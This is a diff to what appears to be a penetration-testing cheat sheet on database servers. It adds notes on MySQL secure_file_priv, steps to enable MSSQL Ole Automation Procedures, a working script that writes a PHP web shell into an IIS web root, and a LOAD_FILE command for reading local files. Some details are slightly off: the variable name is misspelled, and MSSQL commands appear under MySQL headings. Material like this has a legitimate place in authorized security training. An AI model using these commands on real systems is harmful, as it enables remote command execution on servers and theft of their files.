@@ -11,6 +11,57 @@ sudo nmap <TARGET IP> -sV -sC -p3306 --script mysql*
 mysql -u <username> -p -h <TARGET IP>
 ```
 
+
+## MySQL - Secure File Privileges
+
+`secure_file_priv` may be set as follows:
+
+- If empty, the variable has no effect, which is not a secure setting.
+- If set to the name of a directory, we can only import and export data from that directory and not from anywhere else.
+
+```mysql
+show variables like "secure_file_prive";
+```
+
+## Enable Ole Automation Procedures
+
+- Enabling `Enable Ole Automation Procedures` allows us to `write` files.
+- `Ole Automation Procedures` require admin privileges.
+
+```mysql
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+```
+
+## Using Ole Automation Procedure to create PHP WebShell by Creating a File
+
+- **Requires** : `Ole Automation Procedures` 
+- Creating a file requires the above privilege and only then we can create a file and then we can write our `PHP` web shell and then execute it.
+
+```mysql
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+```
+
+
+## Read Local Files
+
+```mysql
+mysql> select LOAD_FILE("<filepath>");
+```
+
 ## Commands
 
 |**Command**|**Description**|
